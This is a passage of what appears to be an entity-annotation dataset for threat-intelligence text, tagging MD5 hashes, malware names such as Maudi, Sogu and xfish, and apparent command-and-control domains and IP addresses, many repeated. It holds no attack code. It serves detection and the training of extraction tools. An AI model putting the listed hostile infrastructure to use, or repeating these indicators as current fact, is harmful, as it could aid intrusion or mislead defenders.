89, "type": "MD5"}], [{"name": "o enbtcd@yahoo.com.co", "pos": [3, 5], "sent_id": 89, "type": "Indicator"}], [{"name": "Maudi", "pos": [1, 2], "sent_id": 90, "type": "Malware"}], [{"name": "windows-liveupdate.com", "pos": [5, 6], "sent_id": 90, "type": "Indicator"}], [{"name": "windowsliveupdatecache.com", "pos": [7, 8], "sent_id": 90, "type": "Indicator"}], [{"name": "Briba", "pos": [8, 9], "sent_id": 91, "type": "Malware"}], [{"name": "c0d0so0", "pos": [11, 12], "sent_id": 91, "type": "Malware"}], [{"name": "bd9a1fbd76c00015a59a3b5c93d4030e", "pos": [0, 1], "sent_id": 92, "type": "MD5"}], [{"name": "bd9a1fbd76c00015a59a3b5c93d4030e", "pos": [0, 1], "sent_id": 92, "type": "MD5"}], [{"name": "c64aab79e5107fc8ffd4699288c2e3be", "pos": [2, 3], "sent_id": 92, "type": "MD5"}], [{"name": "c64aab79e5107fc8ffd4699288c2e3be", "pos": [2, 3], "sent_id": 92, "type": "MD5"}], [{"name": "c9f33d544c5657d4ba55a92e06e38d06", "pos": [4, 5], "sent_id": 92, "type": "MD5"}], [{"name": "c9f33d544c5657d4ba55a92e06e38d06", "pos": [4, 5], "sent_id": 92, "type": "MD5"}], [{"name": "49c7cae0fda8e5089e993a169c6c4197", "pos": [6, 7], "sent_id": 92, "type": "MD5"}], [{"name": "49c7cae0fda8e5089e993a169c6c4197", "pos": [6, 7], "sent_id": 92, "type": "MD5"}], [{"name": "914fdaf7aa098ac00067a2b265fc91da", "pos": [8, 9], "sent_id": 92, "type": "MD5"}], [{"name": "914fdaf7aa098ac00067a2b265fc91da", "pos": [8, 9], "sent_id": 92, "type": "MD5"}], [{"name": "o hlemonk@163.com", "pos": [39, 41], "sent_id": 93, "type": "Email"}], [{"name": "Maudi", "pos": [7, 8], "sent_id": 94, "type": "Malware"}], [{"name": "mol-government.com", "pos": [9, 10], "sent_id": 94, "type": "Indicator"}], [{"name": "newsyandex.com", "pos": [11, 12], "sent_id": 94, "type": "Indicator"}], [{"name": "c93f8a7a899142db1e92138b76407588", "pos": [0, 1], "sent_id": 95, "type": "MD5"}], [{"name": "c93f8a7a899142db1e92138b76407588", "pos": [0, 1], "sent_id": 95, "type": "MD5"}], [{"name": "227636fb88e19eca33a02cbb46f279fb", "pos": [1, 2], "sent_id": 95, "type": "MD5"}], [{"name": "6e88c39c270e259c4472f6eceb8a241f", "pos": [0, 1], "sent_id": 96, "type": "MD5"}], [{"name": "865fec48937686c2d0708847f30b1264", "pos": [1, 2], "sent_id": 96, "type": "MD5"}], [{"name": "c07e857d2602d2a813fd23d711871571", "pos": [0, 1], "sent_id": 97, "type": "MD5"}], [{"name": "a25e5bcc52c386eb046149799ed81b2b", "pos": [1, 2], "sent_id": 97, "type": "MD5"}], [{"name": "a25e5bcc52c386eb046149799ed81b2b", "pos": [1, 2], "sent_id": 97, "type": "MD5"}], [{"name": "3563c21cf5c46e8e39f17e733c2b9b1e", "pos": [2, 3], "sent_id": 97, "type": "MD5"}], [{"name": "e78d39d1862338e4c711238223618e44", "pos": [5, 6], "sent_id": 97, "type": "MD5"}], [{"name": "Mol-government.com", "pos": [0, 1], "sent_id": 99, "type": "Indicator"}], [{"name": "Sogu", "pos": [11, 12], "sent_id": 99, "type": "TrojanHorse"}], [{"name": "Thoper", "pos": [13, 14], "sent_id": 99, "type": "TrojanHorse"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "yt.bodologetee.com", "pos": [0, 1], "sent_id": 101, "type": "Indicator"}], [{"name": "0cf15b88b18cdedfaae598e9498768e3", "pos": [0, 1], "sent_id": 105, "type": "MD5"}], [{"name": "0cf15b88b18cdedfaae598e9498768e3", "pos": [0, 1], "sent_id": 105, "type": "MD5"}], [{"name": "1e60824de00ce3c1f62fddc54a9c5c93", "pos": [2, 3], "sent_id": 105, "type": "MD5"}], [{"name": "1e60824de00ce3c1f62fddc54a9c5c93", "pos": [2, 3], "sent_id": 105, "type": "MD5"}], [{"name": "c64dd5393a17226b208b049a4b766bd6", "pos": [4, 5], "sent_id": 105, "type": "MD5"}], [{"name": "c64dd5393a17226b208b049a4b766bd6", "pos": [4, 5], "sent_id": 105, "type": "MD5"}], [{"name": "646cfe960219f1948eac580e3bd836f8", "pos": [6, 7], "sent_id": 105, "type": "MD5"}], [{"name": "646cfe960219f1948eac580e3bd836f8", "pos": [6, 7], "sent_id": 105, "type": "MD5"}], [{"name": "ef404a76bd11e1d675b7686775ed7f1c", "pos": [8, 9], "sent_id": 105, "type": "MD5"}], [{"name": "beijingnew", "pos": [10, 11], "sent_id": 105, "type": "Malware"}], [{"name": "jiagu", "pos": [11, 12], "sent_id": 105, "type": "Malware"}], [{"name": "jiagu", "pos": [12, 13], "sent_id": 105, "type": "Malware"}], [{"name": "text1", "pos": [13, 14], "sent_id": 105, "type": "Malware"}], [{"name": "nsc01", "pos": [0, 1], "sent_id": 106, "type": "Malware"}], [{"name": "771a376df6aba0ce31e0c8e43cdf0800", "pos": [0, 1], "sent_id": 110, "type": "Indicator"}], [{"name": "xfish", "pos": [2, 3], "sent_id": 110, "type": "Malware"}], [{"name": "c3d14ee0bd01ebc9e5844578babe462f", "pos": [3, 4], "sent_id": 110, "type": "Indicator"}], [{"name": "xfish", "pos": [5, 6], "sent_id": 110, "type": "Malware"}], [{"name": "14e04fcd7d769512b8a5e6e4905cd541", "pos": [0, 1], "sent_id": 161, "type": "MD5"}], [{"name": "68fbf9f48878ccd4d5addb255aea62d1", "pos": [1, 2], "sent_id": 161, "type": "MD5"}], [{"name": "bf50a4810e1bd9485822ec026fbcc176", "pos": [2, 3], "sent_id": 161, "type": "MD5"}], [{"name": "cc2397095e848f585970f1224bc24313", "pos": [3, 4], "sent_id": 161, "type": "MD5"}], [{"name": "d049654602597df24ca07c3bce885e8d", "pos": [4, 5], "sent_id": 161, "type": "MD5"}], [{"name": "09d07702e68abcfd6ab092e3c07624a6", "pos": [5, 6], "sent_id": 161, "type": "MD5"}], [{"name": "4390c478c960c09c7a1a745a2fc14059", "pos": [0, 1], "sent_id": 162, "type": "MD5"}], [{"name": "4b7f6d184952b6cd7a793b620d04f94d", "pos": [1, 2], "sent_id": 162, "type": "MD5"}], [{"name": "740828346fa3b403255fa50f24de0b33", "pos": [2, 3], "sent_id": 162, "type": "MD5"}], [{"name": "937f44857ab11320e3f73bbde559d019", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "a48bd91396b98124cc278221f96fdf7c", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": "ccbb7928ae3b53464690d523860fbeb4", "pos": [2, 3], "sent_id": 163, "type": "MD5"}], [{"name": "da7e73ad2092ecf4aba68d7934df6d85", "pos": [0, 1], "sent_id": 164, "type": "MD5"}], [{"name": "01c1481a275c11f16979cad33975205a", "pos": [1, 2], "sent_id": 164, "type": "MD5"}], [{"name": "03287af69ef4828b1d1e6664eafe7cc1", "pos": [2, 3], "sent_id": 164, "type": "MD5"}], [{"name": "04f16f2729d7c3347deb747fb06c4e5a", "pos": [3, 4], "sent_id": 164, "type": "MD5"}], [{"name": "0c3963e90c6652b17f0f31c6821d41b0", "pos": [4, 5], "sent_id": 164, "type": "MD5"}], [{"name": "0f9d9caa21e3cf2dcdca14e3d7ccc337", "pos": [0, 1], "sent_id": 165, "type": "MD5"}], [{"name": "0fc9ed37c5cca5bfb726718c77cb7b0d", "pos": [0, 1], "sent_id": 166, "type": "MD5"}], [{"name": "106ae2f5128e9d54334b82f6e16ebd84", "pos": [1, 2], "sent_id": 166, "type": "MD5"}], [{"name": "1321e4bbcf0ec423d2fd4c556c7a10a9", "pos": [0, 1], "sent_id": 167, "type": "MD5"}], [{"name": "150aaf3de22afbb13a443be33123e411", "pos": [1, 2], "sent_id": 167, "type": "MD5"}], [{"name": "216011f19981aedf78346d5a7e59d318", "pos": [2, 3], "sent_id": 167, "type": "MD5"}], [{"name": "22e81ed5f4b3e8bb109a328c43e50b78", "pos": [3, 4], "sent_id": 167, "type": "MD5"}], [{"name": "24f1ccbc64587281be2ff87d3ef0c381", "pos": [4, 5], "sent_id": 167, "type": "MD5"}], [{"name": "2977209445d17781f793e7a684be9bb8", "pos": [6, 7], "sent_id": 167, "type": "MD5"}], [{"name": "2addee24fabdcb6f210140bc7e65502b", "pos": [0, 1], "sent_id": 168, "type": "MD5"}], [{"name": "2dca87e53573148ff4f8238f39004271", "pos": [1, 2], "sent_id": 168, "type": "MD5"}], [{"name": "31e4783c9bdfe17d8fb6976b79127c77", "pos": [2, 3], "sent_id": 168, "type": "MD5"}], [{"name": "343bea185561b5baad1da9b8a6c7e38e", "pos": [3, 4], "sent_id": 168, "type": "MD5"}], [{"name": "3783c0c404564fa2e7feef966ffa1d64", "pos": [4, 5], "sent_id": 168, "type": "MD5"}], [{"name": "38f82f67cdb48ec33a39deba4a6444b7", "pos": [5, 6], "sent_id": 168, "type": "MD5"}], [{"name": "3dcd1ea6a9943f99299bdeb6f38680de", "pos": [6, 7], "sent_id": 168, "type": "MD5"}], [{"name": "3fc1ec32376569389ea6db6463d474a3", "pos": [7, 8], "sent_id": 168, "type": "MD5"}], [{"name": "401e2a036d9d4956805d67117697193b", "pos": [8, 9], "sent_id": 168, "type": "MD5"}], [{"name": "4069a5690e64ffefbcae25ddef1f7017", "pos": [9, 10], "sent_id": 168, "type": "MD5"}], [{"name": "40de9d48dd7add3001da8a6e81e75850", "pos": [10, 11], "sent_id": 168, "type": "MD5"}], [{"name": "4159f6ec7da5ac9e79f4463c0994ce39", "pos": [11, 12], "sent_id": 168, "type": "MD5"}], [{"name": "433f123423136569a8fcc8bad96638d0", "pos": [12, 13], "sent_id": 168, "type": "MD5"}], [{"name": "44937bb4dd5320f4225c0ae74587f28e", "pos": [13, 14], "sent_id": 168, "type": "MD5"}], [{"name": "451a68f622493eb57f3450d3065a53e4", "pos": [14, 15], "sent_id": 168, "type": "MD5"}], [{"name": "46029bb9623bb37698354a9b80a3c63d", "pos": [15, 16], "sent_id": 168, "type": "MD5"}], [{"name": "463d308a7b1b3e2279cf5ae724cb887c", "pos": [0, 1], "sent_id": 169, "type": "MD5"}], [{"name": "46e14a7ad7dff5eb2b90c5ae1020df6f", "pos": [1, 2], "sent_id": 169, "type": "MD5"}], [{"name": "4a4dbfb626f3a04b152e5d702517f556", "pos": [2, 3], "sent_id": 169, "type": "MD5"}], [{"name": "4a8b86c8627b2a0da1a786a94c08a263", "pos": [3, 4], "sent_id": 169, "type": "MD5"}], [{"name": "4aa7f0c8980fe529594f52772693caca", "pos": [4, 5], "sent_id": 169, "type": "MD5"}], [{"name": "4bf956e04d08640bf51cd60f887c7274", "pos": [0, 1], "sent_id": 170, "type": "MD5"}], [{"name": "4c2df9200775d5e6f0cef469eb9f55a8", "pos": [1, 2], "sent_id": 170, "type": "MD5"}], [{"name": "4d45559794e2f9a3385f84fb43bc199e", "pos": [2, 3], "sent_id": 170, "type": "MD5"}], [{"name": "567eac46e43baa23d6f7f488e7cbc372", "pos": [3, 4], "sent_id": 170, "type": "MD5"}], [{"name": "57ee371849907f6215a9642da189c2e5", "pos": [0, 1], "sent_id": 171, "type": "MD5"}], [{"name": "6179bbfd346a0fa2a020dcee06efd91a", "pos": [1, 2], "sent_id": 171, "type": "MD5"}], [{"name": "627b3dcf0461b6ff388c0dac71074ee5", "pos": [0, 1], "sent_id": 172, "type": "MD5"}], [{"name": "xboyu.dlinkddns.com", "pos": [3, 4], "sent_id": 172, "type": "Indicator"}], [{"name": "xboyu.dlinkddns.com", "pos": [3, 4], "sent_id": 172, "type": "Indicator"}], [{"name": "xboyu.dlinkddns.com", "pos": [3, 4], "sent_id": 172, "type": "Indicator"}], [{"name": "wang981200.3322.org", "pos": [1, 2], "sent_id": 173, "type": "Indicator"}], [{"name": "updatewin.3322.org", "pos": [2, 3], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "127.0.0.1", "pos": [3, 4], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "zeropan007.3322.org", "pos": [4, 5], "sent_id": 173, "type": "Indicator"}], [{"name": "8852.vicp.cc", "pos": [5, 6], "sent_id": 173, "type": "Indicator"}], [{"name": "qytianzheng.3322.org", "pos": [6, 7], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "220.175.13.250", "pos": [7, 8], "sent_id": 173, "type": "Indicator"}], [{"name": "asiondragon2008.3322.org", "pos": [11, 12], "sent_id": 173, "type": "Indicator"}], [{"name": "asiondragon2008.3322.org", "pos": [11, 12], "sent_id": 173, "type": "Indicator"}], [{"name": "asiondragon2008.3322.org", "pos": [11, 12], "sent_id": 173, "type": "Indicator"}], [{"name": "asiondragon2008.3322.org", "pos": [11, 12], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "yanfengjiaoxp.gicp.net", "pos": [12, 13], "sent_id": 173, "type": "Indicator"}], [{"name": "mail.lufare.com", "pos": [13, 14], "sent_id": 173, "type": "Indicator"}], [{"name": "mail.lufare.com", "pos": [13, 14], "sent_id": 173, "type": "Indicator"}], [{"name": "mail.lufare.com", "pos": [13, 14], "sent_id": 173, "type": "Indicator"}], [{"name": "mail.lufare.com", "pos": [13, 14], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "bmw.webhop.net", "pos": [14, 15], "sent_id": 173, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "q944642367.gicp.net", "pos": [0, 1], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "2yanfengjiaoxp.gicp.net", "pos": [2, 3], "sent_id": 174, "type": "Indicator"}], [{"name": "news.lufare.com", "pos": [3, 4], "sent_id": 174, "type": "Indicator"}], [{"name": "news.lufare.com", "pos": [3, 4], "sent_id": 174, "type": "Indicator"}], [{"name": "services.servebbs.org", "pos": [1, 2], "sent_id": 175, "type": "Indicator"}], [{"name": "services.servebbs.org", "pos": [1, 2], "sent_id": 175, "type": "Indicator"}], [{"name": "services.servebbs.org", "pos": [1, 2], "sent_id": 175, "type": "Indicator"}], [{"name": "services.servebbs.org", "pos": [1, 2], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "cttwxsw.gicp.net", "pos": [2, 3], "sent_id": 175, "type": "Indicator"}], [{"name": "sophia.8800.org", "pos": [3, 4], "sent_id": 175, "type": "Indicator"}], [{"name": "jiang2368131.3322.org", "pos": [5, 6], "sent_id": 175, "type": "Indicator"}], [{"name": "black203.blogdns.com", "pos": [6, 7], "sent_id": 175, "type": "Indicator"}], [{"name": "infasd.crabdance.com", "pos": [9, 10], "sent_id": 175, "type": "Indicator"}], [{"name": "infasd.crabdance.com", "pos": [9, 10], "sent_id": 175, "type": "Indicator"}], [{"name": "222.134.42.62", "pos": [12, 13], "sent_id": 175, "type": "Indicator"}], [{"name": "222.134.42.62", "pos": [12, 13], "sent_id": 175, "type": "Indicator"}], [{"name": "222.134.42.62", "pos": [12, 13], "sent_id": 175, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "wang2368131.gicp.net", "pos": [2, 3], "sent_id": 176, "type": "Indicator"}], [{"name": "mail.sufare.com", "pos": [3, 4], "sent_id": 176, "type": "Indicator"}], [{"name": "mail.sufare.com", "pos": [3, 4], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "surpriseing.homeftp.org", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "117.40.239.20", "pos": [5, 6], "sent_id": 176, "type": "Indicator"}], [{"name": "117.40.239.20", "pos": [5, 6], "sent_id": 176, "type": "Indicator"}], [{"name": "117.40.239.20", "pos": [5, 6], "sent_id": 176, "type": "Indicator"}], [{"name": "117.40.239.20", "pos": [5, 6], "sent_id": 176, "type": "Indicator"}], [{"name": "117.40.239.20", "pos": [5, 6], "sent_id": 176, "type": "Indicator"}], [{"name": "123.151.193.236", "pos": [7, 8], "sent_id": 176, "type": "Indicator"}], [{"name": "123.151.193.236", "pos": [7, 8], "sent_id": 176, "type": "Indicator"}], [{"name": "123.151.193.236", "pos": [7, 8], "sent_id": 176, "type": "Indicator"}], [{"name": "df611.gicp.net", "pos": [8, 9], "sent_id": 176, "type": "Indicator"}], [{"name": "df611.gicp.net", "pos": [8, 9], "sent_id": 176, "type": "Indicator"}], [{"name": "df611.gicp.net", "pos": [8, 9], "sent_id": 176, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "360liveupdate.com", "pos": [0, 1], "sent_id": 177, "type": "Indicator"}], [{"name": "dongtaiwang.vicp.net", "pos": [8, 9], "sent_id": 177, "type": "Indicator"}], [{"name": "dongtaiwang.vicp.net", "pos": [8, 9], "sent_id": 177, "type": "Indicator"}], [{"name": 